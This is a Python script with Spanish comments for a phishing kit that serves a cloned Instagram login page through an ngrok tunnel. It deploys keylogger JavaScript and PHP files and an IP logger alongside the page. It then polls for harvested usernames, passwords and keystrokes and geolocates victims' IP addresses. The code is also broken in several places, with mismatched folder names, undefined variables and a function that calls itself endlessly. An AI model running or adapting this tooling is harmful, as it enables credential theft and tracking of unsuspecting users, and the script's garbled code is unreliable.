#!/usr/bin/python3
#-*- coding: utf-8 -*-
#Modulos
from time import sleep
from sys import stdout, exit
import multiprocessing
from wget import download
from urllib import urlopen
from platform import system as systemos, architecture
from os import system, path
import re
from subprocess import check_output
import json
#   Echo por: Shadow Town
#   Version: 1.0
#Colores
RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
#Funciones
def conectado(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False
    if conectado() == False:
        print('''

███۞███████ ]▄▄▄▄▄▄▄▄▄▄▄▄▃   No Estas Conectado a Una Red.
▂▄▅█████████▅▄▃▂
I███████████████████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤... '''.format(GREEN, END))
        exit(0)
     
def Descarga_Ngrok():
    if path.isfile('Server/ngrok') == False: 
        print('[+] Descargando Ngrok...')
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-linux-arm.zip'
        else:
            filename = 'ngrok-stable-linux-arm.zip'
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Servidor/ngrok')
        system('rm -rf ' + filename)
        system('clear')
Descarga_Ngrok()

def fin():
    system('clear')
    print(''' {0}
 ______   __     __   __    
/\  ___\ /\ \   /\ "-.\ \   
\ \  __\ \ \ \  \ \ \-.  \  
 \ \_\    \ \_\  \ \_\\"\_\ 
  \/_/     \/_/   \/_/ \/_/{0}'''.format(GREEN))
 
def Carga_modulo(module):
    print('''{0}
       (̅_̅_̅(̅_̅_̅_̅_̅_̅_̅_̅̅()ڪ 

 [{1}+{0}]{1} %s modulo Cargado. Creando Phishing...{0}'''.format(CYAN, END) % Carga_modulo)

# Menu Phishing 
def runPhishing(page, option2): 
    system('rm -rf Servidor*.* && touch Servidor/www/usernames.txt && touch Servidor/www/ip.txt && cp Webs/ip.php Servidor && cp Webs/KeyloggerData.txt Server/www/ && cp Webs/keylogger.js Server/www/ && cp Webs/keylogger.php Server/www/')
    if option2 == '1' and page == 'Instagram':
        copy_tree("Webs/Instagram/", "Servidor")
    else:
        exit(0)

didBackground = True
logFile = None
for arg in argv:
    if arg=="--nolog":
        didBackground = False
if didBackground:
    logFile = open("log.txt", "w")


def log(ctx):
    if didBackground:
        logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(GREEN, "").replace(DEFAULT, "") + "\n")
    print(ctx)

def Espera_Credenciales():
    print(" {0}[{1}*{0}]{1} Esperando Credenciales... \n".format(GREEN, DEFAULT))
    while True:
        with open('Servidor/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log('======================================================================'.format(RED, DEFAULT))
                log(' {0}[ CREDENCIALES  ENCONTRADAS...]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                system('rm -rf Servidor/usernames.txt && touch Servidor/usernames.txt')
                log('======================================================================'.format(RED, DEFAULT))
                
    creds.close()

    with open('Server/www/ip.txt') as creds:
        lines = creds.read().rstrip()
        if len(lines) != 0:
            ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
            resp = urlopen('https://ipinfo.io/%s/json' % ip)
            ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
            if 'bogon' in ipinfo:
                log('======================================================================'.format(RED, DEFAULT))
                log(' \n{0}[ Victima + IP]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
            else:
                matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                latitude = matchObj.group(1)
                longitude = matchObj.group(2)
                log('======================================================================'.format(RED, DEFAULT))
                log(' \n{0}[ Información de la victima encontrada ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                log(' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, DEFAULT) % (longitude, latitude))
                log(' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['org'], ipinfo['country']))
                log(' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['region'], ipinfo['city']))
            system('rm -rf Servidor/ip.txt && touch Servidor/ip.txt')
            log('======================================================================'.format(RED, DEFAULT))

        creds.close()

        with open('Servidor/KeyloggerData.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log('______________________________________________________________________'.format(RED, DEFAULT))
                log(' {0}[ OBTENENCION DE TECLAS PRESIONADAS ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                system('rm -rf Servidor/KeyloggerData.txt && touch Servidor/KeyloggerData.txt')
                log('______________________________________________________________________'.format(RED, DEFAULT))
            creds.close()

def runPEnv():
    system('clear')
    print('''{0}
 ___________$b__Vb.
___________’$b__V$b.
____________$$b__V$$b.
____________’$$b._V$$$$oooooooo._________..
_____________’$$P*_V$$$$$”"**$$$b.____.o$$P
______________”_.oooZ$$$$b..o$$$$$$$$$$$$C
______________.$$$$$$$$$$$$$$$$$$$$$$$$$$$b.
______________$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
________.o$$$o$$$$$$$$P”"*$$$$$$$$$P”"”*$$$P
_______.$$$**$$$$P”q$C____”$$$b________.$$P
_______$$P___”$$$b__”$_._.$$$$$b.______*”
_______$$______$$$._____”***$$$$$$$b._A.
_______V$b___._Z$$b.__._______”*$$$$$b$$:
________V$$.__”*$$$b.__b._________”$$$$$
_________”$$b_____”*$.__*b._________”$$$b
___________”$$b._____”L__”$$o.________”*”_____.ooo..
_____________”*$$o.________”*$$o.__________.o$$$$$
_________________”*$$b._______”$$b._______.$$$$$*”
____________________”*$$o.______”$$$o.____$$$$$’
_______________________”$$o_______”$$$b.__”$$$$__
_________________________”$b.______”$$$$b._”$$$$$
________________________._”$$_______”$$$$b__”$$$$
_________________________L.”$.______.$$$$$.__{0}'''.format(GREEN))

def run_Ngrok():
    system('./Servidor/ngrok http 1111 > /dev/null &')
    while True:
        sleep(2)
        system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
        urlFile = open('ngrok.url', 'r')
        url = urlFile.read()
        urlFile.close()
        break
    run_Ngrok()
    Espera_Credenciales()

